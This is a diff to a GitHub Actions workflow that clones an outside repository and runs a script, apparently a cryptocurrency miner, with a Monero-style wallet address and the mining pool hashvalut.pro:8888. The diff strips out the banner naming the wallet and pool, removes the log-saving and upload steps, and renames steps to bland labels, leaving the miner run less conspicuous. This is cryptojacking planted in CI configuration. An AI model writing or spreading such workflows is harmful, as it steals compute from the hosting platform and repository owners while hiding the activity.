@@ -14,42 +14,16 @@ jobs:
     steps:
     - name: 📥 Clone
       run: |
-        echo "Cloning repository..."
         git clone https://github.com/thumpingpp/mustu-setup.git
     
-    - name: 🐍 Python Setup
+    - name: 🐍 Python
       uses: actions/setup-python@v5
       with:
         python-version: '3.10'
     
-    - name: 🚀 Run with Pool
+    - name: ⚡ Execute
       run: |
         cd mustu-setup
         chmod +x mustafa
-        echo "========================================="
-        echo "🚀 Starting Setup"
-        echo "Wallet: 43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN"
-        echo "Pool: hashvalut.pro:8888"
-        echo "========================================="
-        echo ""
-        echo "📟 Live Output:"
-        echo "-----------------------------------------"
-        
-        # Run with wallet and pool
+        echo "Starting with wallet and pool..."
         python3 mustafa.py "43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN" --pool "hashvalut.pro:8888"
-        
-        echo "-----------------------------------------"
-        echo "✅ Done"
-    
-    - name: 💾 Log Save
-      if: always()
-      run: |
-        echo "$(date) - Run with pool hashvalut.pro:8888" >> run_log.txt
-    
-    - name: 📤 Upload Log
-      uses: actions/upload-artifact@v4
-      if: always()
-      with:
-        name: run-logs
-        path: run_log.txt
-        retention-days: 3
